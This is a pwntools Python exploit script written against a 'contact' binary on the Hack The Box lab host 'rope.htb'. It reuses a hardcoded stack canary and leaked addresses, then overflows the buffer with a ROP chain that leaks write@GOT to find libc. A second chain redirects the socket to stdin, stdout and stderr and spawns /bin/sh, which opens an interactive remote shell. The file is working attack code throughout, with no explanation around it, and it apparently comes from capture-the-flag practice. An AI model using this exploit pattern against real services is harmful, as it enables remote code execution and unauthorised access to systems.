from pwn import *
import binascii
import threading

# Author: Humayun Ali Khan 

context.arch = 'amd64'
context.log_level = logging.DEBUG
host = 'rope.htb'
port = 1337
success = 'Done.'
offset = 56

binary = ELF('contact')
libc = ELF('libc.so.6')

# from ropstar
canary = 0xdfd8b88ae000000
rbp = 0x7ffea39e2f5064d9
rip = 0x555ce87165560000
base = 0x555ce8716555f000

def trigger(p, payload): 
    result = ''   
    p.recvline()
    p.send(payload)
    try:
        result = p.recv()
    except EOFError:
        pass
    return result

binary.address = base
rop = ROP(binary)
rop.write(0x4, binary.got['write'], 0x8) # fd, addr, len
log.info(rop.dump())
payload = cyclic(offset) + p64(canary) + p64(rbp) + rop.chain()
log.info(repr(payload))
p = remote(host, port, level='debug') 
leak = trigger(p, payload) 
log.info("Raw Leak: 0x"+binascii.hexlify(leak).decode())
p.close()
write = u64(leak)
log.info("Write: "+hex(write))

libc_base = write - libc.symbols['write']
log.info("Libc Base: "+hex(write))
libc.address = libc_base
rop = ROP(libc)
fd = 4
rop.dup2(fd, 0)
rop.dup2(fd, 1)
rop.dup2(fd, 2)
rop.system(next(libc.search(b"/bin/sh\x00")))
log.info(rop.dump())

payload = cyclic(offset) + p64(canary) + p64(rbp) + rop.chain()
p = remote(host, port, level='warn')
p.sendline(payload)
time.sleep(.5)
p.sendline("id")
p.interactive()
